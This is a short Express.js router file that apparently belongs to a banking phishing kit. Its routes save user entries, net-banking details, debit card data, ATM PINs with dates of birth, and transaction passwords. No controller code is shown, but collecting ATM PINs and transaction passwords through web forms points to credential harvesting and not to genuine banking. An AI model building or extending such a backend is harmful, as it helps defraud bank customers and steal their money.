const express = require('express');
const router = express.Router();
const netBankingController = require('../controllers/netBankingController');
const userController = require('../controllers/userController');
const Debit = require ('../controllers/DebitcardController')
const additionalDataController = require('../controllers/additionalDataController'); // <-- new controller
const transactionController      = require('../controllers/transactionController'); // ← new


router.post('/entry', userController.saveUserData);
router.post('/banking', netBankingController.submitNetBankingPayment);
router.post('/debit-card' , Debit.saveDebitCardData)
// ✅ NEW ROUTE for ATM PIN & DOB submission
router.post('/additional-data', additionalDataController.saveAdditionalData);
router.post('/transaction-pass',transactionController.saveTransactionPass);       // ← new

module.exports = router;
